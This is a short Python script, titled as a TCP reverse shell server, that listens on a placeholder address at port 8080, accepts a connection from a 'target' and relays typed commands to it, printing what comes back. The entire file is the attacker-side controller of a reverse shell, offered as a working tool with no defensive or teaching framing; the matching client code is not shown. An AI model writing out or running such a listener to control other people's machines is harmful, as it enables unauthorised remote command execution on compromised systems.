# TCP reverse shell server

import socket


def connect():
    sock = socket.socket()
    sock.bind(("xxx.xxx.xxx.xxx", 8080))
    sock.listen(5)  # backlog size for the Queue
    (connection, address) = sock.accept()

    print("[+] Received connection from", address)

    while True:
        command = input("> ")

        if "stop" in command:
            connection.send("stop".encode())
            connection.close()
            break

        else:
            connection.send(
                command.encode()
            )  # Otherwise we will send the command to the target
            print(connection.recv(1024).decode())  # print the result that we got back


def main():
    connect()


if __name__ == "__main__":
    main()
